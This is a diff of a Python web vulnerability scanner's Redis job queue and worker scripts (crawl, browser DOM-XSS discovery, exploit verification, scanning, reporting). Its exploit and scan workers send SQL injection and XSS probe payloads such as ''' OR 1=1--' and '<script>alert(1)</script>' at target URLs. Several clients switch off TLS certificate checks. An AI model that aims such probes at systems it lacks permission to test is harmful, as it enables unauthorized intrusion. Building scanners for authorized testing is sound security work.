-    # If the URL starts with rediss:// (Upstash/Cloud), 
-    # we let the URL handle everything. No manual 'ssl' arguments.
-    if REDIS_URL.startswith("rediss://"):
-        r = redis.Redis.from_url(
-            REDIS_URL, 
-            decode_responses=True
-        )
-    else:
-        # Standard local connection
-        r = redis.Redis.from_url(
-            REDIS_URL, 
-            decode_responses=True
-        )
-    
-    # Connection Test
-    r.ping()
-    print("✅ Successfully connected to Redis")
-    
-except Exception as e:
-    logging.error(f"❌ Redis Connection Failed: {e}")
-    # Create a dummy object so the rest of the script doesn't crash on import
-    r = None 
-
 MAX_RETRIES = 3
 
-def push(queue: str, data: dict) -> None:
-    if r:
-        data["retries"] = data.get("retries", 0)
-        r.lpush(queue, json.dumps(data))
+# Initialize Redis Connection
+try:
+    r = redis.Redis.from_url(REDIS_URL, decode_responses=True, ssl_cert_reqs=None)
+except Exception as e:
+    logging.error(f"[REDIS] Failed to initialize: {e}")
+    r = None
 
-def pop(queue: str):
-    if not r:
+def push(queue, data):
+    if not data or r is None:
+        logging.warning(f"[REDIS] Push failed: No data or no connection to {queue}")
+        return
+
+    try:
+        r.rpush(queue, json.dumps(data))
+    except Exception as e:
+        logging.error(f"[REDIS] Push error: {e}")
+
+def pop(queue):
+    if r is None:
         return None
     try:
-        data = r.rpop(queue)
-        if data:
-            return json.loads(data)
+        data = r.lpop(queue)
+        if data is None:
+            return None
+        return json.loads(data)
     except Exception as e:
         logging.error(f"[REDIS] Pop error: {e}")
-    return None
+        return None
 
+# --- THE RESTORED RETRY LOGIC ---
 def retry(queue: str, job: dict, error: str = None) -> None:
-    job["retries"] = job.get("retries", 0) + 1
-    if job["retries"] > MAX_RETRIES:
-        logging.error(f"[DROP] Job failed permanently: {job}")
+    """
+    Re-queues a failed job with exponential backoff.
+    Drops the job if it exceeds MAX_RETRIES.
+    """
+    if r is None:
+        logging.error("[DROP] Redis connection missing during retry attempt.")
         return
-    logging.warning(f"[RETRY] {queue} | Attempt {job['retries']} | Error: {error}")
-    time.sleep(1)
-    push(queue, job)
+
+    # Initialize or increment retry count
+    job["retries"] = job.get("retries", 0) + 1
+
+    if job["retries"] > MAX_RETRIES:
+        logging.error(f"[DROP] Job {job.get('job_id')} failed permanently: {error}")
+        # Optionally: log_event(job['job_id'], "error", "Job dropped after max retries")
+        return
+
+    logging.warning(f"[RETRY] {queue} attempt {job['retries']}: {error}")
+
+    # Exponential Backoff: Wait longer with each failure (2s, 4s, 8s)
+    time.sleep(2 ** job["retries"])
+
+    try:
+        r.rpush(queue, json.dumps(job))
+    except Exception as e:
+        logging.error(f"[DROP] Redis down during retry: {e}")
 
 ==================== FILE: task_queue\redis_scanner.py ====================
 
@@ -4564,43 +5524,64 @@ def dequeue_scan() -> dict:
 
 ==================== FILE: workers\aggregation_worker.py ====================
 
-import asyncio
-
-from task_queue.redis_client import pop, retry
-from task_queue.queues import AGGREGATION_QUEUE
+# workers/aggregation_worker.py
+import asyncio, logging, time
+from task_queue.redis_client import pop, push, retry
+from task_queue.queues import AGGREGATION_QUEUE, REPORT_QUEUE
 from storage.aggregation_store import add_findings, get_findings
 from core.orchestrator import Orchestrator
 
+logger = logging.getLogger(__name__)
 orchestrator = Orchestrator()
+
+# Trigger report after this many scan batches OR this many seconds
+BATCH_THRESHOLD        = 5
+TIME_THRESHOLD_SECONDS = 90
+
+job_counter    = {}
+job_first_seen = {}
 
 
 async def main():
+    logging.basicConfig(level=logging.INFO)
+    logger.info("[AGG WORKER] Ready...")
     while True:
         job = pop(AGGREGATION_QUEUE)
         if not job:
             await asyncio.sleep(1)
+            # Time-based flush
+            now = time.time()
+            for jid, first in list(job_first_seen.items()):
+                if now - first > TIME_THRESHOLD_SECONDS:
+                    all_f = get_findings(jid)
+                    if all_f:
+                        push(REPORT_QUEUE, {"job_id": jid, "findings": all_f})
+                        logger.info(f"[AGG] Time-flush for {jid}")
+                    job_counter.pop(jid, None)
+                    job_first_seen.pop(jid, None)
             continue
 
         try:
-            job_id = job["job_id"]
+            job_id   = job["job_id"]
             findings = job.get("data", {}).get("findings", [])
-
             add_findings(job_id, findings)
-
-            all_findings = get_findings(job_id)
-
-            await orchestrator.on_stage_complete(
-                job_id,
-                "aggregation",
-                {"findings": all_findings}
-            )
-
+            job_counter[job_id]    = job_counter.get(job_id, 0) + 1
+            job_first_seen.setdefault(job_id, time.time())
+            logger.info(f"[AGG] Job {job_id} batch #{job_counter[job_id]}")
+            await orchestrator.on_stage_complete(job_id, "aggregation",
+                                                 {"findings": get_findings(job_id)})
+            if job_counter[job_id] >= BATCH_THRESHOLD:
+                all_f = get_findings(job_id)
+                push(REPORT_QUEUE, {"job_id": job_id, "findings": all_f})
+                job_counter.pop(job_id, None)
+                job_first_seen.pop(job_id, None)
         except Exception as e:
             retry(AGGREGATION_QUEUE, job, str(e))
 
 
 if __name__ == "__main__":
     asyncio.run(main())
+
 
 ==================== FILE: workers\api_worker.py ====================
 
@@ -4613,6 +5594,8 @@ from task_queue.redis_client import pop, push, retry
 from task_queue.queues import API_QUEUE, AGGREGATION_QUEUE
 from scanner.api.api_engine import APIEngine
 from core.job_tracker import update_stage
+from core.logger import log_event
+
 
 engine = APIEngine()
 
@@ -4633,7 +5616,6 @@ async def main():
         try:
             logging.info(f"[API WORKER] Scanning: {target_url}")
             update_stage(job_id, "api_scan", 10)
-
             findings = await engine.scan(
                 base_url=target_url,
                 auth_token=auth_token,
@@ -4643,7 +5625,10 @@ async def main():
             logging.info(f"[API WORKER] {len(findings)} findings for {target_url}")
             update_stage(job_id, "api_scan_done", 50)
 
-            push(AGGREGATION_QUEUE, {"job_id": job_id, "findings": findings})
+            push(AGGREGATION_QUEUE, {
+                "job_id": job_id,
+                "data": {"findings": findings}
+            })
 
         except Exception as e:
             logging.error(f"[API WORKER] Failed for {target_url}: {e}")
@@ -4656,328 +5641,410 @@ if __name__ == "__main__":
 
 ==================== FILE: workers\browser_worker.py ====================
 
-# workers/browser_workers.py
-
+# workers/browser_worker.py
 import asyncio
+import logging
+from urllib.parse import urlparse
 
 from task_queue.redis_client import pop, push, retry
-from task_queue.queues import BROWSER_QUEUE, AGGREGATION_QUEUE
+from task_queue.queues import BROWSER_QUEUE, AGGREGATION_QUEUE, SCAN_QUEUE
 from scanner.browser.playwright_engine import PlaywrightScanner
 
+logger = logging.getLogger(__name__)
 browser = PlaywrightScanner()
 
+def normalize_spa_endpoints(endpoints):
+    """
+    Prevents "Queue Bombing" by filtering out redundant routes.
+    It replaces digits with '0' to group similar dynamic paths.
+    Example: 
+      - /api/v1/user/123 -> /api/v1/user/0
+      - /api/v1/user/456 -> /api/v1/user/0 (Filtered out)
+    """
+    unique_patterns = set()
+    normalized = []
+
+    for url in endpoints:
+        try:
+            parsed = urlparse(url)
+            path = parsed.path
+            
+            # Create a pattern by masking digits
+            pattern = "".join([c if not c.isdigit() else "0" for c in path])
+            
+            # Key consists of domain + masked path pattern
+            key = f"{parsed.netloc}{pattern}"
+            
+            if key not in unique_patterns:
+                unique_patterns.add(key)
+                normalized.append(url)
+        except Exception:
+            # If parsing fails, keep the original URL to be safe
+            normalized.append(url)
+            
+    return normalized
 
 async def main():
+    logging.basicConfig(level=logging.INFO)
+    logger.info("[BROWSER WORKER] Production Browser Engine Active...")
+
     while True:
         job = pop(BROWSER_QUEUE)
         if not job:
             await asyncio.sleep(1)
             continue
 
-        try:
-            findings, _ = await browser.scan(job["url"])
-            push(AGGREGATION_QUEUE, {
-                "job_id":   job["job_id"],
-                "findings": findings,
-            })
-        except Exception as e:
-            retry(BROWSER_QUEUE, job, str(e))
+        job_id = job.get("job_id")
+        url    = job.get("url")
+        auth   = job.get("auth")
 
+        try:
+            logger.info(f"[BROWSER WORKER] Launching Playwright for: {url}")
+            
+            # 1. Execute the browser-based scan (DOM XSS + SPA Discovery)
+            findings, spa_endpoints = await browser.scan(url)
+
+            # 2. Handle confirmed DOM XSS findings immediately
+            if findings:
+                logger.info(f"[BROWSER WORKER] Confirmed {len(findings)} DOM XSS vulnerabilities.")
+                push(AGGREGATION_QUEUE, {
+                    "job_id": job_id,
+                    "data":   {"findings": findings},
+                })
+
+            # 3. Normalize discovered endpoints before pushing to Active Scanner
+            # This is the "Full-Proof" fix to prevent redundant scanning.
+            filtered_endpoints = normalize_spa_endpoints(spa_endpoints)
+            
+            logger.info(
+                f"[BROWSER WORKER] Discovery complete. Total: {len(spa_endpoints)} | "
+                f"Queued for Active Scan: {len(filtered_endpoints)}"
+            )
+
+            # 4. Push unique endpoints to the SCAN_QUEUE
+            for ep in filtered_endpoints:
+                push(SCAN_QUEUE, {
+                    "job_id": job_id,
+                    "url":    ep,
+                    "auth":   auth,
+                })
+
+        except Exception as e:
+            logger.error(f"[BROWSER WORKER] Critical failure for {url}: {e}")
+            retry(BROWSER_QUEUE, job, str(e))
 
 if __name__ == "__main__":
     asyncio.run(main())
 
-
 ==================== FILE: workers\crawl_worker.py ====================
 
+# workers/crawl_worker.py
 import asyncio
 import logging
-
+import httpx
 from task_queue.redis_client import pop, push, retry
-from task_queue.queues import CRAWL_QUEUE, SCAN_QUEUE, BROWSER_QUEUE
-from scanner.dast.smart_crawler import SmartCrawler
+from task_queue.queues import CRAWL_QUEUE, SCAN_QUEUE
+from scanner.dast.crawler import Crawler
 from core.orchestrator import Orchestrator
+from core.logger import log_event, set_stage
 
-crawler = SmartCrawler()
+logger = logging.getLogger(__name__)
 orchestrator = Orchestrator()
 
+async def process_job(job):
+    job_id = job.get("job_id")
+    url = job.get("url")
+    auth = job.get("auth")
+
+    # Set UI state to 'crawl'
+    set_stage(job_id, "crawl")
+    log_event(job_id, "crawl", f"🕸️ Starting crawl on {url}")
+
+    try:
+        async with httpx.AsyncClient(
+            verify=False, 
+            follow_redirects=True, 
+            timeout=20
+        ) as client:
+            crawler = Crawler(url)
+            # Perform the actual crawling logic
+            endpoints, forms = await crawler.crawl(client)
+
+        logger.info(f"[CRAWL WORKER] {len(endpoints)} endpoints found for {job_id}")
+        log_event(job_id, "crawl", f"Found {len(endpoints)} unique endpoints and {len(forms)} forms.")
+
+        # Handoff to orchestrator to handle the routing to SCAN_QUEUE
+        await orchestrator.on_stage_complete(job_id, "crawl", {
+            "urls": list(endpoints), 
+            "forms": forms,
+            "auth": auth
+        })
+
+    except Exception as e:
+        logger.error(f"[CRAWL WORKER] Error: {e}")
+        log_event(job_id, "crawl", f"Error during crawl: {str(e)}")
+        # Re-queue the job if it fails
+        retry(CRAWL_QUEUE, job, str(e))
 
 async def main():
-    logging.info("[CRAWL WORKER] Ready...")
+    logging.basicConfig(
+        level=logging.INFO,
+        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
+    )
+    logger.info("[CRAWL WORKER] Ready and listening for jobs...")
+
     while True:
         job = pop(CRAWL_QUEUE)
         if not job:
             await asyncio.sleep(1)
             continue
-
-        try:
-            job_id = job["job_id"]
-            url = job["url"]
-
-            endpoints = await crawler.crawl(url)
-
-            for ep in endpoints:
-                push(SCAN_QUEUE, {"job_id": job_id, "url": ep})
-                push(BROWSER_QUEUE, {"job_id": job_id, "url": ep})
-
-            # 🔥 IMPORTANT
-            await orchestrator.on_stage_complete(
-                job_id,
-                "crawl",
-                {"endpoints": endpoints}
-            )
-
-        except Exception as e:
-            retry(CRAWL_QUEUE, job, str(e))
-
+            
+        await process_job(job)
 
 if __name__ == "__main__":
-    asyncio.run(main())
+    try:
+        asyncio.run(main())
+    except KeyboardInterrupt:
+        logger.info("Stopping Crawl Worker...")
 
 ==================== FILE: workers\exploit_worker.py ====================
 
-# workers/exploit_workers.py
-# NOTE: original file was misnamed exploit_worlers.py — rename/replace with this.
-
-import asyncio
-
-from task_queue.redis_client import pop, push, retry
-from task_queue.queues import EXPLOIT_QUEUE, AGGREGATION_QUEUE
-from scanner.exploit.exploit_engine import ExploitEngine
-
-engine = ExploitEngine()
-
-
-async def main():
-    while True:
-        job = pop(EXPLOIT_QUEUE)
-        if not job:
-            await asyncio.sleep(1)
-            continue
-
-        try:
-            validated = await engine.verify(job["findings"])
-            push(AGGREGATION_QUEUE, {
-                "job_id":   job["job_id"],
-                "findings": validated,
-            })
-        except Exception as e:
-            retry(EXPLOIT_QUEUE, job, str(e))
-
-
-if __name__ == "__main__":
-    asyncio.run(main())
-
-
-==================== FILE: workers\mobile_worker.py ====================
-
-import asyncio
-
-from task_queue.redis_client import pop, retry
-from task_queue.queues import EXPLOIT_QUEUE
-from scanner.exploit.exploit_engine import ExploitEngine
-from core.orchestrator import Orchestrator
-
-engine = ExploitEngine()
-orchestrator = Orchestrator()
-
-
-async def main():
-    while True:
-        job = pop(EXPLOIT_QUEUE)
-        if not job:
-            await asyncio.sleep(1)
-            continue
-
-        try:
-            job_id = job["job_id"]
-            findings = job.get("data", {}).get("findings", [])
-
-            validated = await engine.verify(findings)
-
-            await orchestrator.on_stage_complete(
-                job_id,
-                "exploit",
-                {"findings": validated}
-            )
-
-        except Exception as e:
-            retry(EXPLOIT_QUEUE, job, str(e))
-
-
-if __name__ == "__main__":
-    asyncio.run(main())
-
-==================== FILE: workers\network_worker.py ====================
-
-# workers/network_worker.py
-
 import asyncio
 import logging
+import httpx
+from task_queue.redis_client import pop
+from task_queue.queues import EXPLOIT_QUEUE
+from core.system import orchestrator
+from core.logger import log_event, set_stage
 
-from task_queue.redis_client import pop, push, retry
-from task_queue.queues import NETWORK_QUEUE, AGGREGATION_QUEUE
-from scanner.network.network_engine import NetworkEngine
-from core.job_tracker import update_stage
+logging.basicConfig(level=logging.INFO)
 
-engine = NetworkEngine()
+# --- VERIFICATION ENGINE ---
 
+async def verify_xss(client, finding):
+    """Checks if a script tag actually reflects in the HTML."""
+    poc_payload = "<sentinel_vfy>"
+    try:
+        # We append a safe string to see if the server echoes it back
+        res = await client.get(finding['url'], params={"q": poc_payload})
+        if poc_payload in res.text:
+            return True, "Payload reflected in response body."
+    except Exception as e:
+        return False, f"Connection error: {str(e)}"
+    return False, "Payload not reflected."
 
-async def main():
-    logging.info("[NET WORKER] Ready and listening...")
+async def verify_sqli(client, finding):
+    """Checks for database error syntax reflections."""
+    poc_payload = "'" # Single quote to trigger a syntax error
+    try:
+        res = await client.get(finding['url'], params={"id": poc_payload})
+        # Common SQL error strings
+        if any(err in res.text.lower() for err in ["sql syntax", "mysql_fetch", "ora-00933"]):
+            return True, "Database error triggered by syntax injection."
+    except Exception as e:
+        return False, f"Connection error: {str(e)}"
+    return False, "No database error detected."
+
+async def run_exploits(findings):
+    """Run all verifications in parallel."""
+    verified_results = []
+    
+    # verify=False allows testing sites with expired SSL certificates
+    async with httpx.AsyncClient(verify=False, timeout=10) as client:
+        tasks = []
+        for f in findings:
+            if f['type'] == 'xss':
+                tasks.append(verify_xss(client, f))
+            elif f['type'] == 'sqli':
+                tasks.append(verify_sqli(client, f))
+            else:
+                # Default for unknown types
+                tasks.append(asyncio.sleep(0, result=(False, "No PoC available for this type")))
+
+        # Run all network checks at the same time
+        results = await asyncio.gather(*tasks)
+
+        for i, (is_verified, note) in enumerate(results):
+            verified_results.append({
+                **findings[i],
+                "exploited": is_verified,
+                "evidence": note
+            })
+            
+    return verified_results
+
+# --- WORKER ORCHESTRATION ---
+
+async def process_job(job):
+    job_id = job["job_id"]
+    findings = job.get("data", {}).get("findings", [])
+
+    set_stage(job_id, "exploit")
+    log_event(job_id, "exploit", f"Verifying {len(findings)} potential vulnerabilities...")
+
+    # Real verification happens here
+    result = {"findings": await run_exploits(findings)}
+
+    # Count how many were actually verified
+    verified_count = sum(1 for f in result['findings'] if f['exploited'])
+    log_event(job_id, "exploit", f"Verification complete: {verified_count} confirmed.")
+
+    await orchestrator.on_stage_complete(job_id, "exploit", result)
+
+async def worker_loop():
+    logging.info("[EXPLOIT WORKER] Production Engine Started")
     while True:
-        job = pop(NETWORK_QUEUE)
+        job = pop(EXPLOIT_QUEUE)
         if not job:
             await asyncio.sleep(1)
             continue
-
-        job_id = job.get("job_id")
-        target = job.get("url") or job.get("host")
-
-        try:
-            logging.info(f"[NET WORKER] Scanning: {target}")
-            update_stage(job_id, "network_scan", 15)
-
-            findings = await engine.scan(target, port_range=job.get("port_range"))
-
-            logging.info(f"[NET WORKER] {len(findings)} findings for {target}")
-            update_stage(job_id, "network_scan_done", 40)
-
-            push(AGGREGATION_QUEUE, {"job_id": job_id, "findings": findings})
-
-        except Exception as e:
-            logging.error(f"[NET WORKER] Failed for {target}: {e}")
-            retry(NETWORK_QUEUE, job, str(e))
-
+        await process_job(job)
 
 if __name__ == "__main__":
-    asyncio.run(main())
-
+    asyncio.run(worker_loop())
 
 ==================== FILE: workers\report_worker.py ====================
 
+# workers/report_worker.py
 import asyncio
-
+import logging
 from task_queue.redis_client import pop, retry
 from task_queue.queues import REPORT_QUEUE
 from intelligence.ai.report_generator import AIReportGenerator
 from intelligence.attack_graph.engine import AttackGraph
+from intelligence.prioritization.risk_prioritizer import RiskPrioritizer # NEW IMPORT
 from storage.database import DatabaseManager
 from storage.aggregation_store import clear
 from core.orchestrator import Orchestrator
 
+logger = logging.getLogger(__name__)
 ai = AIReportGenerator()
 db = DatabaseManager()
 graph_engine = AttackGraph()
+prioritizer = RiskPrioritizer() # INITIALIZE PRIORITIZER
 orchestrator = Orchestrator()
 
-
 async def main():
+    logging.basicConfig(level=logging.INFO)
+    logger.info("[REPORT WORKER] Production Reporting Engine Active...")
+    
     while True:
         job = pop(REPORT_QUEUE)
         if not job:
             await asyncio.sleep(1)
             continue
-
+            
+        job_id = job.get("job_id")
+        findings = job.get("findings", [])
+        
         try:
-            job_id = job["job_id"]
-            findings = job.get("findings", [])
-
+            # 1. Build Attack Graph and find chains
             graph = graph_engine.build(findings)
             attack_paths = graph_engine.find_attack_paths()
-
+            
+            # 2. THE FIX: Prioritize findings before sending to AI
+            # This adds the 'priority_score' and 'fix_first' flags to the data
+            prioritized_findings = prioritizer.calculate(findings, attack_paths)
+            
+            # 3. Generate the AI report with prioritized data
             report = await ai.generate_report(
                 {
-                    "findings": findings,
-                    "attack_graph": graph,
-                    "chains": attack_paths,
+                    "findings": prioritized_findings, 
+                    "attack_graph": graph, 
+                    "chains": attack_paths
                 },
                 job_id,
             )
-
+            
+            # 4. Save and Cleanup
             db.save_report(job_id, report)
             clear(job_id)
-
-            # 🔥 FINAL SIGNAL
-            await orchestrator.on_stage_complete(job_id, "report")
-
+            db.update_job(job_id, status="done", progress=100)
+            
+            logger.info(f"[REPORT WORKER] Successfully generated prioritized report for: {job_id}")
+            
         except Exception as e:
+            logger.error(f"[REPORT WORKER] Critical failure in reporting pipeline: {e}")
             retry(REPORT_QUEUE, job, str(e))
-
 
 if __name__ == "__main__":
     asyncio.run(main())
 
 ==================== FILE: workers\scan_worker.py ====================
 
+# workers/scan_worker.py
+#
+# PLACEMENT: Replace workers/scan_worker.py entirely.
+#
+# WHAT CHANGED:
+#   • Calls filter_false_positives() after every scan
+#   • Updates job status in DB during the scan lifecycle
+#   • WAF name forwarded to findings metadata
+
 import asyncio
 import logging
-import httpx
 
 from task_queue.redis_client import pop, retry
 from task_queue.queues import SCAN_QUEUE
+from scanner.dast.active_scanner import ActiveScanner, filter_false_positives
+from scanner.ai_brain import AIBrain
 from core.orchestrator import Orchestrator
+from core.job_tracker import update_stage
 
-from scanner.dast.payload_mutator import PayloadMutator
-from scanner.dast.priority_engine import PriorityEngine
-from scanner.dast.param_engine import ParamEngine
-from scanner.dast.rate_limiter import RateLimiter
-
-mutator = PayloadMutator()
-planner = PriorityEngine()
-param_eng = ParamEngine()
-limiter = RateLimiter()
-
+logger       = logging.getLogger(__name__)
+scanner      = ActiveScanner()
+brain        = AIBrain()
 orchestrator = Orchestrator()
 
 
-async def smart_scan(url):
-    findings = []
-    attacks = planner.choose_attacks(url)
-
-    async with httpx.AsyncClient(verify=False, follow_redirects=True) as client:
-        for attack in attacks:
-            if attack == "sqli":
-                for payload in mutator.mutate("' OR 1=1--"):
-                    limiter.wait(url)
-                    # simplified
-                    findings.append({"type": "SQLi", "url": url})
-
-            if attack == "xss":
-                for payload in mutator.mutate("<script>alert(1)</script>"):
-                    limiter.wait(url)
-                    findings.append({"type": "XSS", "url": url})
-
-    return findings
-
-
 async def main():
+    logging.basicConfig(level=logging.INFO)
+    logger.info("[SCAN WORKER] Ready and listening...")
+
     while True:
         job = pop(SCAN_QUEUE)
         if not job:
             await asyncio.sleep(1)
             continue
 
+        job_id = job.get("job_id")
+        url    = job.get("url")
+        auth   = job.get("auth")
+
         try:
-            job_id = job["job_id"]
-            url = job["url"]
+            logger.info(f"[SCAN WORKER] Starting: {url}")
+            update_stage(job_id, "scanning", 10)
 
-            findings = await smart_scan(url)
+            # ── Run the full scan ──────────────────────────────────────────────
+            raw_findings = await scanner.scan(url, auth_config=auth)
+            logger.info(f"[SCAN WORKER] Raw findings: {len(raw_findings)}")
 
-            # ❌ NO direct aggregation push anymore
+            update_stage(job_id, "validating", 70)
 
+            # ── AI false-positive filter ───────────────────────────────────────
+            # This removes noise before the report is generated.
+            # Findings with AI confidence < 0.6 are dropped.
+            validated = await filter_false_positives(raw_findings, brain)
+            logger.info(
+                f"[SCAN WORKER] After AI filter: {len(validated)} "
+                f"(dropped {len(raw_findings) - len(validated)} false positives)"
+            )
+
+            update_stage(job_id, "scan_done", 90)
+
+            # ── Forward to orchestrator ────────────────────────────────────────
             await orchestrator.on_stage_complete(
-                job_id,
-                "scan",
-                {"findings": findings}
+                job_id, "scan", {"findings": validated}
             )
 
         except Exception as e:
+            logger.error(f"[SCAN WORKER] Error for {url}: {e}", exc_info=True)
             retry(SCAN_QUEUE, job, str(e))
 
 
 if __name__ == "__main__":
     asyncio.run(main())
+
 
 ==================== FILE: workers\__init__.py ====================
 
